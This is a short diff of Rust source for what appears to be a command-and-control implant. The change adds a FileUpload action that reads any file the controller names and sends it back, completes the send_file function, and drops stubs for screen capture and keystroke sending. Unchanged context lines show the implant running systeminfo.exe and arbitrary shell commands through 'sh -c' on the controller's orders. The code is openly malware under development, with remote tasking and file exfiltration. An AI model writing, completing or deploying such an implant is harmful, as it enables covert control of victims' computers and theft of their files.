@@ -71,6 +71,9 @@ async fn handle_body(body: String) {
                 c2_actions::SystemInfo => {
                     send_sys_info().await;
                 }
+                c2_actions::FileUpload => {
+                    send_file(c2_response.task_parameters).await;
+                }
                 _ => {
                     println!("Unknown action type");
                 }
@@ -87,8 +90,6 @@ async fn send_sys_info() {
     exec_shell_command("systeminfo.exe".to_string()).await;
 }
 async fn send_file(target_file: String) {
-    println!("TODO");
-
     let file = std::fs::read(&target_file);
     match file {
         Ok(file) => {
@@ -99,12 +100,7 @@ async fn send_file(target_file: String) {
         }
     }
 }
-async fn send_screen_capture() {
-    println!("Sending screen capture");
-}
-async fn send_key_strokes() {
-    println!("Sending keystrokes");
-}
+
 async fn exec_shell_command(params: String) {
     let output = Command::new("sh")
         .arg("-c")
